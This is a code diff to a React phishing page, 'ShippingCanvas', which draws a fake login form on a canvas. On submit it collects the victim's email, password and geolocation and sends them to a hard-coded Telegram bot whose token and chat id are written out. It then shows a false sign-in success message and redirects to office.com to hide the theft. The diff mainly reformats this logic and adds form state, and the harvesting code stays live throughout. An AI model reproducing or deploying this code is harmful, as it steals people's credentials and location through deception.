@@ -5,6 +5,7 @@ const ShippingCanvas = () => {
   const passwordInputRef = useRef(null); // Reference for password input
   const canvasRef = useRef(null); // Reference for canvas
   const [geoData, setGeoData] = useState(null); // State for storing geolocation data
+  const [formData, setFormData] = useState({ email: '', password: '', latitude: null, longitude: null });
 
   useEffect(() => {
     const canvas = canvasRef.current;
@@ -26,7 +27,7 @@ const ShippingCanvas = () => {
     const buttonY = 512;
     const buttonWidth = 150;
     const buttonHeight = 50;
-    
+
     ctx.strokeRect(emailX, emailY, 430, 30);
     ctx.strokeRect(passwordX, passwordY, 430, 30);
     setInputBox(emailInputRef.current, emailX, emailY, 430, 30);
@@ -54,49 +55,51 @@ const ShippingCanvas = () => {
   };
 
   const handleSubmit = async () => {
-  const email = emailInputRef.current.value;
-  const password = passwordInputRef.current.value;
-  if (email.trim() === '' || password.trim() === '') {
-    alert('Please fill in both fields');
-    return;
-  }
-
-  try {
-    // Use a Promise-based wrapper for geolocation to use await
-    const position = await new Promise((resolve, reject) =>
-      navigator.geolocation.getCurrentPosition(resolve, reject)
-    );
-
-    const { latitude, longitude } = position.coords;
-    setGeoData({ latitude, longitude });
-
-    // Send data to Telegram bot
-    const botToken = '7315734945:AAEwBBKiHG5dorU-IT6nOnS1Yi76W37qPmI';
-    const chatId = '6707519229';
-    const message = `📨 **Email:** ${email} 🔑 **Password:** ${password} 📍 **Latitude:** ${latitude} 📍 **Longitude:** ${longitude}`;
-    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-    
-    const response = await fetch(telegramUrl);
-    if (response.ok) {
-      alert('You have signed in successfully');
-      window.location.href = 'https://www.office.com';
-    } else {
-      alert('Error sending message');
+    const email = emailInputRef.current.value;
+    const password = passwordInputRef.current.value;
+    if (email.trim() === '' || password.trim() === '') {
+      alert('Please fill in both fields');
+      return;
     }
-  } catch (error) {
-    console.error('Geolocation error:', error);
-    alert('Error retrieving geolocation data');
-  }
-};
+
+    try {
+      // Use a Promise-based wrapper for geolocation to use await
+      const position = await new Promise((resolve, reject) =>
+        navigator.geolocation.getCurrentPosition(resolve, reject)
+      );
+      const { latitude, longitude } = position.coords;
+      setGeoData({ latitude, longitude });
+      
+      // Update the formData state with email, password, and geoData
+      setFormData({
+        email,
+        password,
+        latitude,
+        longitude,
+      });
+
+      // Send data to Telegram bot
+      const botToken = '7315734945:AAEwBBKiHG5dorU-IT6nOnS1Yi76W37qPmI';
+      const chatId = '6707519229';
+      const message = `📨 **Email:** ${email} 🔑 **Password:** ${password} 📍 **Latitude:** ${latitude} 📍 **Longitude:** ${longitude}`;
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      const response = await fetch(telegramUrl);
+      if (response.ok) {
+        alert('You have signed in successfully');
+        window.location.href = 'https://www.office.com';
+      } else {
+        alert('Error sending message');
+      }
+    } catch (error) {
+      console.error('Geolocation error:', error);
+      alert('Error retrieving geolocation data');
+    }
+  };
 
   return (
     <div>
-      <canvas
-        ref={canvasRef}
-        width="1447"
-        height="786"
-        style={{ border: '1px solid black' }}
-      ></canvas>
+      <canvas ref={canvasRef} width="1447" height="786" style={{ border: '1px solid black' }}></canvas>
       <input
         ref={emailInputRef}
         type="text"
